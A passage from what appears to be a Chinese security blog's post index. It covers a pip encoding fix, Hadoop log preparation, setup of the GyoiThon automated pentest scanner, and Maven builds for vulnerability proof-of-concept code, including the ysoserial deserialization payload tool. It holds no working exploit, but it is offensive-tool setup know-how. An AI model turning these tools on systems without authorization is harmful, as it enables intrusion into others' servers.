    "tags"     : "python, Terminal",
    "url"      : "/blog/2020/pip-unknown-encoding/",
    "date"     : "Apr 1, 2020",
    "content"  : "可怖的unkownencoding.自从修改了windows终端的编码格式后，就出了各种问题，几乎在终端上执行的软件都运行不了，提示LookupError:unknownencoding:cp65001，如下报错。C:\\Users\\本阿信&gt;pip--versionTraceback(mostrecentcalllast):File\"c:\\python27\\lib\\runpy.py\",line174,in_run_module_as_main\"__main__\",fname,loader,pkg_name)File\"c:\\python27\\lib\\runpy.py\",line72,in_run_codeexeccodeinrun_globalsFile\"C:\\Python27\\Scripts\\pip.exe\\__main__.py\",line4,in&lt;module&gt;File\"c:\\python27\\lib\\site-packages\\pip\\_internal\\cli\\main.py\",line10,in&lt;module&gt;frompip._internal.cli.autocompletionimportautocompleteFile\"c:\\python27\\lib\\site-packages\\pip\\_internal\\cli\\autocompletion.py\",line9,in&lt;module&gt;frompip._internal.cli.main_parserimportcreate_main_parserFile\"c:\\python27\\lib\\site-packages\\pip\\_internal\\cli\\main_parser.py\",line7,in&lt;module&gt;frompip._internal.cliimportcmdoptionsFile\"c:\\python27\\lib\\site-packages\\pip\\_internal\\cli\\cmdoptions.py\",line31,in&lt;module&gt;frompip._internal.utils.uiimportBAR_TYPESFile\"c:\\python27\\lib\\site-packages\\pip\\_internal\\utils\\ui.py\",line64,in&lt;module&gt;_BaseBar=_select_progress_class(IncrementalBar,Bar)#type:AnyFile\"c:\\python27\\lib\\site-packages\\pip\\_internal\\utils\\ui.py\",line57,in_select_progress_classsix.text_type().join(characters).encode(encoding)LookupError:unknownencoding:cp65001只能怪自己，好好的改什么txt文本编码，现在好了。解铃还须系铃人：暂时在该终端下可以使用pipC:\\Users\\本阿信&gt;setPYTHONIOENCODING=UTF-8C:\\Users\\本阿信&gt;pip--versionpip20.0.2fromc:\\python27\\lib\\site-packages\\pip(python2.7)链接还建议设置全局变量为$env:PYTHONIOENCODING=\"UTF-8\"，但是我搜索了一下，没有找到方法，希望会的朋友邮件我教我。CHCP936UTF-8是unicode编码的一种落地方案：Unicode符号范围(十六进制)UTF-8编码方式（二进制）00000000-0000007F0xxxxxxx00000080-000007FF110xxxxx10xxxxxx00000800-0000FFFF1110xxxx10xxxxxx10xxxxxx00010000-0010FFFF11110xxx10xxxxxx10xxxxxx10xxxxxx\\x对应的是UTF-8编码的数据，通过转化规则可以转换为Unicode编码，就能得到对应的汉字，转换规则很简单，先将\\x去掉，转换为数字，然后进行对应的位移操作即可，需要注意的是先要判断utf-8的位数."
  },

  {
    "title"    : "「机器学习」：谈谈有关数据预处理中的小技巧-Excel分列",
    "category" : "",
    "tags"     : "笔记, 机器学习, Excel",
    "url"      : "/top/2020/how-to-preview-datas/",
    "date"     : "Feb 24, 2020",
    "content"  : "问题引出hadoop,hive等输出数据导出为csv文件解决：用表格软件打开的数据文件，数据都保存在同一列；通过一些小技巧把一列的数据分成我们所需要的列数。写论文的时候遇到的问题：hadoop1.0.3使用hadoop对数据进行map-reduce操作后，在终端上呈现的形式：192.168.1.23124\t1127.0.0.12621\t1192.168.1.23127\t2192.168.1.23125\t1192.168.1.24411\t1192.168.1.100428\t1127.0.0.12755\t1127.0.0.12625\t2192.168.1.22126\t2192.168.1.1004087\t2这里的操作仅仅是对日志的长度进行了调整，最终目的是对日志进行聚类，所以对数据整合特征，整理出几个特征包括：ip，url长度，parameter长度和visittimesperhours这四个特征；在实际的操作中，是不可能把hadoop的输出打印在终端上然后ctrl+c,ctrl+v，这样的工作量很大。而我们可获得的是：1.当然hadoop也给出了解决方案就是通过web交互页面访问文件，并有下载文件的按钮。2.hadoopfs-get命令同样也可以把输出文件从hdfs文件系统下载到本地。但是使用表格软件打开，所有的数据仍然是处在同一列下，且无法分列。所以导致并不能继续后面的python读取csv的操作，会报错；解决方法：首先需要：数据分列操作：网上有大把的教程提示我们如何去把一堆数据从一列中分离成数列。wps和excel原理基本都不变：选中数据列，点选数据-分列则可进入分列操作，分列操作需要我们去告诉机器，哪些是数据需要分出来单独成一列，所以以下就是重点：分隔符；其次：优化代码的输出：我们需要对代码进行修改，即保证：我们所需要的每列输出的字段和后面的字段中间都存在分隔符，分隔符可以是tab，空格等等；mapprint初始代码printip,format(len(url)),format(len(para))修改后代码，如下，在第二列和第三列输出之间加入了两个空格，告诉pythonprint('')printip,format(len(url)),(''),format(len(para))于是在把输出文件导出后，使用表格软件打开文件同样是所有的数据存在同一列的情况，这个时候我们对数据列进行数据分列操作后即可分出我们所需要的列数，我这个是四列。如下，我们在终端下cat一下：ip,url,para,time127.0.0.1,24,10,303127.0.0.1,14,11,1192.168.1.2,39,32,1192.168.1.2,29,11,2127.0.0.1,40,10,2127.0.0.1,333,20,1127.0.0.1,23,51,2192.168.1.2,5,18,1（表头自己加即可）我们可以看到，数据显示，每列的数据中间都有一个逗号。当然，我们在输出的时候，也可以对数据进行处理，每一列数据都加上逗号，理论上是可行的，我没有试过。鼓励各位多动手。以上。"
  },

  {
    "title"    : "「资产扫描」:Let&#39;s GyoiThon !",
    "category" : "",
    "tags"     : "笔记, 安全工具, Web",
    "url"      : "/blog/2020/GyoiThon-scanner/",
    "date"     : "Jan 21, 2020",
    "content"  : "title:GyoiThonScanner1下载依赖项下载源文件后，进入文件夹路径，根据python的依赖进行安装，即requirements.txt文件：PSG:\\GyoiThon&gt;pipinstall-rrequirements.txtDEPRECATION:Python2.7willreachtheendofitslifeonJanuary1st,2020.PleaseupgradeyourPythonasPython2.7won'tbemaintainedafterthatdate.AfutureversionofpipwilldropsupportforPython2.7.MoredetailsaboutPython2supportinpip,canbefoundathttps://pip.pypa.io/en/latest/development/release-process/#python-2-supportCollectingbeautifulsoup4&gt;=4.6.3Usingcachedhttps://files.pythonhosted.org/packages/c5/48/c88b0b390ae1f785942fc83413feb1268a1eb696f343d4d55db735b9bb39/beautifulsoup4-4.8.2-py2-none-any.whlRequirementalreadysatisfied:cchardet&gt;=2.1.4inc:\\python27\\lib\\site-packages(from-rrequirements.txt(line2))(2.1.5)Collectingcensys&gt;=0.0.8Usingcachedhttps://files.pythonhosted.org/packages/88/4b/3ca07679928c26bb5503b53c37e2f6eef2521289956e2c1bf74b64008afa/censys-0.0.8.tar.gzRequirementalreadysatisfied:docopt&gt;=0.6.2inc:\\python27\\lib\\site-packages(from-rrequirements.txt(line4))(0.6.2)Collectinggoogle-api-python-client&gt;=1.7.4Usingcachedhttps://files.pythonhosted.org/packages/31/c7/16ca16d28f2d71c8bd6fa67c91eb2a82259dc589c0504f903b675ecdaa84/google_api_python_client-1.7.11-py2-none-any.whlCollectingJinja2&gt;=2.10.1Usingcachedhttps://files.pythonhosted.org/packages/65/e0/eb35e762802015cab1ccee04e8a277b03f1d8e53da3ec3106882ec42558b/Jinja2-2.10.3-py2.py3-none-any.whlERROR:Couldnotfindaversionthatsatisfiestherequirementmatplotlib&gt;=3.0.3(from-rrequirements.txt(line7))(fromversions:0.86,0.86.1,0.86.2,0.91.0,0.91.1,1.0.1,1.1.0,1.1.1,1.2.0,1.2.1,1.3.0,1.3.1,1.4.0,1.4.1rc1,1.4.1,1.4.2,1.4.3,1.5.0,1.5.1,1.5.2,1.5.3,2.0.0b1,2.0.0b2,2.0.0b3,2.0.0b4,2.0.0rc1,2.0.0rc2,2.0.0,2.0.1,2.0.2,2.1.0rc1,2.1.0,2.1.1,2.1.2,2.2.0rc1,2.2.0,2.2.2,2.2.3,2.2.4)ERROR:Nomatchingdistributionfoundformatplotlib&gt;=3.0.3(from-rrequirements.txt(line7))报错ERROR:Nomatchingdistributionfoundformatplotlib&gt;=3.0.3(from-rrequirements.txt(line7))称没有找到匹配的版本，以为是pip的版本问题，所以进行pip版本升级。python-mpipinstall--upgradepipDEPRECATION:Python2.7willreachtheendofitslifeonJanuary1st,2020.PleaseupgradeyourPythonasPython2.7won'tbemaintainedafterthatdate.AfutureversionofpipwilldropsupportforPython2.7.MoredetailsaboutPython2supportinpip,canbefoundathttps://pip.pypa.io/en/latest/development/release-process/#python-2-supportRequirementalreadyup-to-date:pipinc:\\python27\\lib\\site-packages(19.3.1)1.1报错解决但是依然无效，系统提示pip为最新版本。思索着应该是python的版本问题。直接就上python3使用pip3进行下载更新：pip3install-rrequirements.txt-ihttp://pypi.douban.com/simple/--trusted-hostpypi.douban.com##速度可以感受一下：Lookinginindexes:http://pypi.douban.com/simple/Requirementalreadysatisfied:beautifulsoup4&gt;=4.6.3in/usr/lib/python3/dist-packages(from-rrequirements.txt(line1))(4.8.0)Collectingcchardet&gt;=2.1.4(from-rrequirements.txt(line2))Downloadinghttp://pypi.doubanio.com/packages/c6/20/905b6c5664736d884a40ac3b1204ab874c3c4a8ce86f7b2e28abc1fc6ee4/cchardet-2.1.5-cp37-cp37m-manylinux1_x86_64.whl(241kB)100%|████████████████████████████████|245kB6.9MB/sCollectingcensys&gt;=0.0.8(from-rrequirements.txt(line3))-i$url--trust-host$host此参数则是指定pip下载更新的url库。后来发现，requirements中，matplotlib&gt;=3.0.3这一项依赖需要python3.6版本以上，所以运行会报错。cat/media/root/binAxin/GyoiThon/requirements.txtbeautifulsoup4&gt;=4.6.3cchardet&gt;=2.1.4censys&gt;=0.0.8docopt&gt;=0.6.2google-api-python-client&gt;=1.7.4Jinja2&gt;=2.10.1matplotlib&gt;=3.0.3msgpack-python&gt;=0.5.6networkx&gt;=2.2pandas&gt;=0.22.0pysocks&gt;=1.6.7Scrapy&gt;=1.5.0tldextract&gt;=2.2.1urllib3&gt;=1.252扫描使用2.1配置host运行gyoithon后，会在module文件夹对CVE漏洞进行更新配置，此时我们等待即可。看一下简介：GyoiThon是一款基于机器学习的渗透测试工具GyoiThon根据学习数据识别安装在Web服务器上的软件（操作系统，中间件，框架，CMS等）。之后，GyoiThon为已识别的软件执行有效的攻击。最终，GyoiThon会自动生成扫描结果报告。上述处理均由GyoiThon自动执行；用户唯一的操作就是在GyoiThon中，输入目标web服务器的首页URL。这非常的简单，几乎不花费你任何的时间和精力，就能让你轻松的识别Web服务器上的漏洞。所以GyoiThon需要一些识别项（特征库）进行匹配，下载完后，就可以使用扫描器了；需要注意的是，我们运行前需要对host文件进行配置#lsconfig.inihandoutLICENSE__pycache__requirements.txtutil.pydockerhost.txtlogsREADME.mdsignaturesutil.pycgyoithon.pyimgmodulesreporttemp_signatures#cathost.txthttplocalhost80/如上，格式为：协议&lt;空格&gt;url地址&lt;空格&gt;端口号&lt;空格&gt;路径PSG:\\GyoiThon&gt;python3.\\gyoithon.py^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^██████╗██╗██╗██████╗██╗████████╗██╗██╗██████╗███╗██╗██╔════╝╚██╗██╔╝██╔═══██╗██║╚══██╔══╝██║██║██╔═══██╗████╗██║██║███╗╚████╔╝██║██║██║██║███████║██║██║██╔██╗██║██║██║╚██╔╝██║██║██║██║██╔══██║██║██║██║╚██╗██║╚██████╔╝██║╚██████╔╝██║██║██║██║╚██████╔╝██║╚████║╚═════╝╚═╝╚═════╝╚═╝╚═╝╚═╝╚═╝╚═════╝╚═╝╚═══╝(beta)^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^bygyoithon.py=[GyoiThonv0.0.3-beta]=+----=[Author:Gyoiler(@gyoithon)]=--+----=[Website:https://github.com/gyoisamurai/GyoiThon/]=--扫描完成后，扫描器就会出一个csv的报告查看即可。以上。"
  },

  {
    "title"    : "Maven构建项目相关一揽子知识",
    "category" : "",
    "tags"     : "笔记, Maven, Web",
    "url"      : "/blog/2020/maven-build-javapro/",
    "date"     : "Jan 19, 2020",
    "content"  : "2020/01/21更新；Thu,26Aug202114:50:02+0800再次更新；序本文主要是对于在漏洞复现犹其是Mavenpoc项目代码的部分个人总结师傅最近让我看freebuf上一篇关于jeeplus代码审计的文章，文章讲的是不错的，自己找了个项目来做，之前没有java开发的基础，所以两眼一抹黑，浪费了不少时间，随笔记。零：各种Maven现象#0x01404notfoundeclipse导入jeeplus项目后，用Maven构建，tomcat部署成功未报错，总是访问不了项目，一直404，以下为CSDN搜索原答案：解决如下选中“项目”，然后右击选择“properties”—&gt;Deployment，然后将webContent项remove掉，还有test相关的文件也可以remove掉，test是测试相关的文件，add一个folder文件，next-&gt;next-&gt;src下的main下的webapp文件，最后击“Finish”，在add一个JavaBuildPathEntries，next-&gt;MavenDependencies最后再点击”Finish”；最后再点击”OK”;重新启动tomcat，在浏览器中输入相应的地址：http://localhost:8080/MavenTest/index.jsp，进行测试web项目是否创建成功。总结：若是IDEA部署出现了404的问题，那么就着重检查ProjectStructure窗口下ProjectSettings:Modules/Libraries/Artifacts/Facets子栏下的配置是否有问题：如Maven项目须在Modules下新建Maven的模版，Web项目Artifacts要添加WebApplication等等若是Terminal终端进行Maven编译后，那么须检查target目录下是否有war/jar文件，随即war:部署到TomcatWebApps|jar:java启动即可。#0x02tomcatjarnotfound如果你是maven项目，tomcat在发布项目的时候没有同时发布maven依赖所添加的jar包，你需要设置一下eclipse：项目-&gt;属性-&gt;DeploymentAssembly-&gt;Add-&gt;JavaBuildPathEntries-&gt;选择MavenDependencies-&gt;Finish-&gt;OK把对应的Maven依赖包也发布到tomcat，调试时会自动把那些jar发布到指定目录下，tomcat也能找到那些jar了。结合eclipse：&gt;mvneclipse:clean&gt;mvneclipse:eclipse&gt;mvneclipse:eclipseEclipse&gt;mvneclipse:eclipse–Dwtpversion=1.0#0x03jar中没有主清单属性1)META-INF/MANIFEST.MF1.1)file–&gt;projectstructure弹框后选中Atifacts—&gt;+-&gt;jar-&gt;frommodulewithdependenceis1.2)选择MainClass，然后指定META-INF/MANIFEST.MF的路径为src下（注意不要放到main/java目录下，否则打成的jar中META-INF/MANIFEST.MF不含有Main-Class信息）或者：2)pom.xml原Github项目kafka-deserialization-bug无法构建成功；2.1)原pomplugin标签&lt;plugins&gt;&lt;plugin&gt;&lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;&lt;artifactId&gt;maven-dependency-plugin&lt;/artifactId&gt;&lt;executions&gt;&lt;execution&gt;&lt;id&gt;copy-dependencies&lt;/id&gt;&lt;phase&gt;prepare-package&lt;/phase&gt;&lt;goals&gt;&lt;goal&gt;copy-dependencies&lt;/goal&gt;&lt;/goals&gt;&lt;configuration&gt;&lt;outputDirectory&gt;${project.build.directory}/lib&lt;/outputDirectory&gt;&lt;/configuration&gt;&lt;/execution&gt;&lt;/executions&gt;&lt;/plugin&gt;&lt;/plugins&gt;修改后：&lt;build&gt;&lt;plugins&gt;&lt;plugin&gt;&lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;&lt;artifactId&gt;maven-dependency-plugin&lt;/artifactId&gt;&lt;executions&gt;&lt;execution&gt;&lt;id&gt;copy-dependencies&lt;/id&gt;&lt;phase&gt;prepare-package&lt;/phase&gt;&lt;goals&gt;&lt;goal&gt;copy-dependencies&lt;/goal&gt;&lt;/goals&gt;&lt;configuration&gt;&lt;outputDirectory&gt;${project.build.directory}/lib&lt;/outputDirectory&gt;&lt;/configuration&gt;&lt;/execution&gt;&lt;/executions&gt;&lt;/plugin&gt;&lt;plugin&gt;&lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;&lt;artifactId&gt;maven-shade-plugin&lt;/artifactId&gt;&lt;version&gt;1.2.1&lt;/version&gt;&lt;executions&gt;&lt;execution&gt;&lt;phase&gt;package&lt;/phase&gt;&lt;goals&gt;&lt;goal&gt;shade&lt;/goal&gt;&lt;/goals&gt;&lt;configuration&gt;&lt;transformers&gt;&lt;transformerimplementation=\"org.apache.maven.plugins.shade.resource.ManifestResourceTransformer\"&gt;&lt;mainClass&gt;com.unionpay.kafka.test.OfficialPocMain&lt;/mainClass&gt;&lt;/transformer&gt;&lt;/transformers&gt;&lt;/configuration&gt;&lt;/execution&gt;&lt;/executions&gt;&lt;/plugin&gt;&lt;/plugins&gt;&lt;/build&gt;一：Maven构建小弟之前java学的贼烂，更别说高端的「Maven」构建了，研究了将近一个星期，终于使用Maven构建起第一个Javaweb项目，按耐不住内心的激动心情，遂记录下第一步获取Maven构建的项目，只有用Maven构建的java项目，我们才能够Maven进行构建部署；下面这个是我用来练手的项目。当然也可以到github上找到。此处Maven环境配置略过，多提一句，这里包括Maven的本地环境变量的配置和本地仓库的配置，自行问度娘。PSC:\\Users\\本阿信&gt;cdG:\\yj-work\\java-code\\jeeplus-openPSG:\\yj-work\\java-code\\jeeplus-open&gt;ls目录:G:\\yj-work\\java-code\\jeeplus-openModeLastWriteTimeLengthName---------------------------d-----2020/1/1016:26.idead-----2020/1/911:03.settingsd-----2020/1/911:03srcd-----2020/1/911:03target-a----2020/1/911:031350.classpath-a----2020/1/911:031444.project-a----2016/9/49:1110252LICENSE-a----2016/9/49:1123054pom.xml-a----2016/9/49:11371README.md#1x01Maven：effective-pom构建如上，关键pom属性；上面可以看到maven构建的pom.xml文件，输入命令mvnhelp:effective-pomMaven将会开始处理并显示effective-pom。如下：PSG:\\yj-work\\java-code\\jeeplus-open&gt;mvnhelp:effective-pom[INFO]Scanningforprojects...[WARNING][WARNING]Someproblemswereencounteredwhilebuildingtheeffectivemodelforjeeplus:jeeplus:war:1.0.0-SNAPSHOT[WARNING]'dependencies.dependency.(groupId:artifactId:type:classifier)'mustbeunique:javax.servlet.jsp:jsp-api:jar-&gt;version2.1vs2.2@line278,column21[WARNING][WARNING]Itishighlyrecommendedtofixtheseproblemsbecausetheythreatenthestabilityofyourbuild.[WARNING][WARNING]Forthisreason,futureMavenversionsmightnolongersupportbuildingsuchmalformedprojects.[WARNING][INFO][INFO]--------------------------&lt;jeeplus:jeeplus&gt;---------------------------[INFO]Buildingjeeplusx1.0.0-SNAPSHOT[INFO]--------------------------------[war]---------------------------------[INFO][INFO]---maven-help-plugin:3.2.0:effective-pom(default-cli)@jeeplus---Downloadingfromalimaven:http://maven.aliyun.com/nexus/content/groups/public/org/apache/maven/maven-model/3.6.1/maven-model-3.6.1.pomDownloadedfromalimaven:http://maven.aliyun.com/nexus/content/groups/public/org/apache/maven/maven-model/3.6.1/maven-model-3.6.1.pom(4.0kBat4.1kB/s)Downloadingfromalimaven:http://maven.aliyun.com/nexus/content/groups/public/org/apache/maven/maven/3.6.1/maven-3.6.1.pomDownloadedfromalimaven:http://maven.aliyun.com/nexus/content/groups/public/org/apache/maven/maven/3.6.1/maven-3.6.1.pom(24kBat95kB/s)###################################################################中间具体下载过程略:&gt;#####################################################################我把这下面的部分，特意区分出来，方便看的更清楚，当我们对项目进行构建时，我们可以看到项目相关的一些元素。有的时候，当我们还是新手的时候，这样的控制台输出真的会令人激动！@-@如下，maven回显出有关于jeeplus项目的EffectivePOMs：[INFO]EffectivePOMs,afterinheritance,interpolation,andprofilesareapplied:&lt;?xmlversion=\"1.0\"encoding=\"GBK\"?&gt;&lt;!--======================================================================--&gt;&lt;!----&gt;&lt;!--GeneratedbyMavenHelpPluginon2020-01-19T15:52:57+08:00--&gt;&lt;!--See:http://maven.apache.org/plugins/maven-help-plugin/--&gt;&lt;!----&gt;&lt;!--======================================================================--&gt;&lt;!--======================================================================--&gt;&lt;!----&gt;&lt;!--EffectivePOMforproject'jeeplus:jeeplus:war:1.0.0-SNAPSHOT'--&gt;&lt;!----&gt;&lt;!--======================================================================--&gt;#########################################################中间具体groupid、artifactid等配置略:&gt;##############################################################[INFO]------------------------------------------------------------------------[INFO]BUILDSUCCESS[INFO]------------------------------------------------------------------------[INFO]Totaltime:12.235s[INFO]Finishedat:2020-01-19T15:53:00+08:00[INFO]------------------------------------------------------------------------在上面的pom.xml中可以看到Maven在执行目标时需要用到的默认工程源码目录结构、输出目录、需要的插件、仓库和报表目录。Maven的pom.xml文件也不需要手工编写。Maven提供了大量的原型插件来创建工程，包括工程结构和pom.xml。顺便提一下关于web中的properties文件配置进入jeeplus项目，根据自己电脑的不同环境，对properties文件进行配置，而此处本地的项目自定义配置数据库配置文件则是\\src\\main\\resources\\jeeplus.properties；我单单把mysql数据库的配置代码贴出来，如下：jdbc.type=mysqljdbc.driver=com.mysql.jdbc.Driverjdbc.url=jdbc:mysql://localhost:3306/jeeplus_schema?useUnicode=true&amp;characterEncoding=utf-8jdbc.username=rootjdbc.password=root把mysql数据库的账号密码设置成本地的数据库账号密码就好，比如我本地的mysql账号密码均为root,填上正确即可，不然会报错。然后运行mysql，下一步就进行maven构建。#1x02Maven：test输入mvntest，查看maven构建java项目是否存在报错：PSG:\\yj-work\\java-code\\jeeplus-open&gt;mvntest[INFO]Scanningforprojects...[WARNING][WARNING]Someproblemswereencounteredwhilebuildingtheeffectivemodelforjeeplus:jeeplus:war:1.0.0-SNAPSHOT[WARNING]'dependencies.dependency.(groupId:artifactId:type:classifier)'mustbeunique:javax.servlet.jsp:jsp-api:jar-&gt;version2.1vs2.2@line278,column21[WARNING][WARNING]Itishighlyrecommendedtofixtheseproblemsbecausetheythreatenthestabilityofyourbuild.[WARNING][WARNING]Forthisreason,futureMavenversionsmightnolongersupportbuildingsuchmalformedprojects.[WARNING][INFO][INFO]--------------------------&lt;jeeplus:jeeplus&gt;---------------------------[INFO]Buildingjeeplusx1.0.0-SNAPSHOT[INFO]--------------------------------[war]---------------------------------[INFO][INFO]---maven-resources-plugin:2.6:resources(default-resources)@jeeplus---[INFO]Using'UTF-8'encodingtocopyfilteredresources.[INFO]Copying65resources[INFO][INFO]---maven-compiler-plugin:3.3:compile(default-compile)@jeeplus---[INFO]Changesdetected-recompilingthemodule![INFO]Compiling258sourcefilestoG:\\yj-work\\java-code\\jeeplus-open\\target\\classes[INFO]/G:/yj-work/java-code/jeeplus-open/src/main/java/com/jeeplus/modules/tools/utils/HttpPostTest.java:某些输入文件使用或覆盖了已过时的API。[INFO]/G:/yj-work/java-code/jeeplus-open/src/main/java/com/jeeplus/modules/tools/utils/HttpPostTest.java:有关详细信息,请使用-Xlint:deprecation重新编译。[INFO]/G:/yj-work/java-code/jeeplus-open/src/main/java/com/jeeplus/common/json/AjaxJson.java:某些输入文件使用了未经检查或不安全的操作。[INFO]/G:/yj-work/java-code/jeeplus-open/src/main/java/com/jeeplus/common/json/AjaxJson.java:有关详细信息,请使用-Xlint:unchecked重新编译。[INFO][INFO]---maven-resources-plugin:2.6:testResources(default-testResources)@jeeplus---[INFO]Using'UTF-8'encodingtocopyfilteredresources.[INFO]skipnonexistingresourceDirectoryG:\\yj-work\\java-code\\jeeplus-open\\src\\test\\resources[INFO][INFO]---maven-compiler-plugin:3.3:testCompile(default-testCompile)@jeeplus---[INFO]Nosourcestocompile[INFO][INFO]---maven-surefire-plugin:2.12.4:test(default-test)@jeeplus---[INFO]------------------------------------------------------------------------[INFO]BUILDSUCCESS[INFO]------------------------------------------------------------------------[INFO]Totaltime:10.063s[INFO]Finishedat:2020-01-19T16:46:53+08:00[INFO]------------------------------------------------------------------------#1x03Maven：cleanpackage紧接着输入mvncleanpackage命令；PSG:\\yj-work\\java-code\\jeeplus-open&gt;mvncleanpackage[INFO]Scanningforprojects...[WARNING][WARNING]Someproblemswereencounteredwhilebuildingtheeffectivemodelforjeeplus:jeeplus:war:1.0.0-SNAPSHOT[WARNING]'dependencies.dependency.(groupId:artifactId:type:classifier)'mustbeunique:javax.servlet.jsp:jsp-api:jar-&gt;version2.1vs2.2@line278,column21[WARNING][WARNING]Itishighlyrecommendedtofixtheseproblemsbecausetheythreatenthestabilityofyourbuild.[WARNING][WARNING]Forthisreason,futureMavenversionsmightnolongersupportbuildingsuchmalformedprojects.[WARNING][INFO][INFO]--------------------------&lt;jeeplus:jeeplus&gt;---------------------------[INFO]Buildingjeeplusx1.0.0-SNAPSHOT[INFO]--------------------------------[war]---------------------------------[INFO][INFO]---maven-clean-plugin:2.5:clean(default-clean)@jeeplus---[INFO]DeletingG:\\yj-work\\java-code\\jeeplus-open\\target[INFO][INFO]---maven-resources-plugin:2.6:resources(default-resources)@jeeplus---[INFO]Using'UTF-8'encodingtocopyfilteredresources.[INFO]Copying65resources[INFO][INFO]---maven-compiler-plugin:3.3:compile(default-compile)@jeeplus---[INFO]Changesdetected-recompilingthemodule![INFO]Compiling258sourcefilestoG:\\yj-work\\java-code\\jeeplus-open\\target\\classes[INFO]/G:/yj-work/java-code/jeeplus-open/src/main/java/com/jeeplus/modules/tools/utils/HttpPostTest.java:某些输入文件使用或覆盖了已过时的API。[INFO]/G:/yj-work/java-code/jeeplus-open/src/main/java/com/jeeplus/modules/tools/utils/HttpPostTest.java:有关详细信息,请使用-Xlint:deprecation重新编译。[INFO]/G:/yj-work/java-code/jeeplus-open/src/main/java/com/jeeplus/common/json/AjaxJson.java:某些输入文件使用了未经检查或不安全的操作。[INFO]/G:/yj-work/java-code/jeeplus-open/src/main/java/com/jeeplus/common/json/AjaxJson.java:有关详细信息,请使用-Xlint:unchecked重新编译。[INFO][INFO]---maven-resources-plugin:2.6:testResources(default-testResources)@jeeplus---[INFO]Using'UTF-8'encodingtocopyfilteredresources.[INFO]skipnonexistingresourceDirectoryG:\\yj-work\\java-code\\jeeplus-open\\src\\test\\resources[INFO][INFO]---maven-compiler-plugin:3.3:testCompile(default-testCompile)@jeeplus---[INFO]Nosourcestocompile[INFO][INFO]---maven-surefire-plugin:2.12.4:test(default-test)@jeeplus---[INFO]Noteststorun.[INFO][INFO]---maven-war-plugin:2.2:war(default-war)@jeeplus---[INFO]Packagingwebapp[INFO]Assemblingwebapp[jeeplus]in[G:\\yj-work\\java-code\\jeeplus-open\\target\\jeeplus][INFO]Processingwarproject[INFO]Copyingwebappresources[G:\\yj-work\\java-code\\jeeplus-open\\src\\main\\webapp][INFO]Webappassembledin[19918msecs][INFO]Buildingwar:G:\\yj-work\\java-code\\jeeplus-open\\target\\jeeplus.war[INFO]WEB-INF\\web.xmlalreadyadded,skipping[INFO]------------------------------------------------------------------------[INFO]BUILDSUCCESS[INFO]------------------------------------------------------------------------[INFO]Totaltime:38.071s[INFO]Finishedat:2020-01-19T16:49:31+08:00[INFO]------------------------------------------------------------------------连着buildsuccess！可真是令人激动；我们可以看到maven已经构建好了tomcat部署所需要的war包：[INFO]Buildingwar:G:\\yj-work\\java-code\\jeeplus-open\\target\\jeeplus.war，直接去对应的绝对路径，把war包ctrl+c到tomcat的webapp文件夹里就好了。至此部署完毕，对项目查看一下，是否已经部署成功。#1x04Maven：POMFailedtoreadfrom/tojenkinsFailedtoreadartifactdescriptorforysoserial:ysoserial:jar:0.0.6-SNAPSHOT:Couldnottransferartifactysoserial:ysoserial:pom:0.0.6-SNAPSHOTfrom/tojenkins(http://repo.jenkins-ci.org/public/)一般情况为指定的Maven仓库或者本地仓库中都没有pom指定的jar包，所以我们要在本地编译好后放入本地仓库；pom：&lt;dependency&gt;&lt;groupId&gt;ysoserial&lt;/groupId&gt;&lt;artifactId&gt;ysoserial&lt;/artifactId&gt;&lt;version&gt;0.0.6-SNAPSHOT&lt;/version&gt;&lt;/dependency&gt;编译：$gitclonegit@github.com:frohoff/ysoserial.git$cdysoserial$mvninstall-DskipTests$mvninstall:install-file-Dfile=/{path/to}/ysoserial-0.0.6-SNAPSHOT-all.jar-DgroupId=ysoserial-DartifactId=ysoserial-Dversion=0.0.6-SNAPSHOT-Dpackaging=jar最后的一条命令groupId/artifactId/version与xml配置文件相互对应即可。二：验证多说无益，上代码：进入tomcat/bin/目录，启动tomcatPSE:\\java\\tomcat\\apache-tomcat-8.5.50\\bin&gt;.\\startup.batUsingCATALINA_BASE:\"E:\\java\\tomcat\\apache-tomcat-8.5.50\"UsingCATALINA_HOME:\"E:\\java\\tomcat\\apache-tomcat-8.5.50\"UsingCATALINA_TMPDIR:\"E:\\java\\tomcat\\apache-tomcat-8.5.50\\temp\"UsingJRE_HOME:\"C:\\ProgramFiles\\Java\\jdk1.8.0_231\\jre\"UsingCLASSPATH:\"E:\\java\\tomcat\\apache-tomcat-8.5.50\\bin\\bootstrap.jar;E:\\java\\tomcat\\apache-tomcat-8.5.50\\bin\\tomcat-juli.jar\"验证是否部署成功：&gt;curllocalhost/jeeplus：PSE:\\java\\tomcat\\apache-tomcat-8.5.50\\bin&gt;curllocalhost/jeeplusStatusCode:200StatusDescription:Content:&lt;!DOCTYPEhtml&gt;&lt;html&gt;&lt;head&gt;&lt;metaname=\"description\"content=\"Userloginpage\"/&gt;&lt;metaname=\"viewport\"content=\"width=device-width,initial-scale=1.0\"/&gt;&lt;scriptsrc=\"/jeeplus...RawContent:HTTP/1.1200Content-Language:zh-CNContent-Length:19162Content-Type:text/html;charset=UTF-8Date:Sun,19Jan202009:23:26GMTParsedHtml:mshtml.HTMLDocumentClassRawContentLength:19162如上，部署成功。返回状态值200。其他上面是Maven创建一个标准化的Java项目，举例：即部署一个maven的项目，我们可以通过上面的方式来进行。更多时候，对于我来说，我高频率使用maven是在对于漏洞的验证和利用阶段，即网上公开的javapoc代码诸如此类，显而易见我更倾向于使用java的poc代码而非python代码。而由于python语言本身的优势，纵观网上很多pythonpoc在我看来，对于我们理解漏洞原理本身无实际意义，我并不是说python的poc代码不好，而是这门语言太便利了以至于我们可以很方便去复现一个漏洞，这样会导致人们尤其是刚入门的小白很少去思考甚至不思考。参考Maven安装本地jar包到本地仓库Github·shiyueqi/kafka-deserialization-bugKafka反序列化漏洞分析idea打包的jar运行报“XXX中没有主清单属性”以上。"
  },

  {
    "title"    : "「笔记」：fortify-error-no-rules-file-found",
    "category" : "",
    "tags"     : "代码审计, 笔记",
    "url"      : "/blog/2020/fortify-error-no-rules-file-found/",
    "date"     : "Jan 7, 2020",
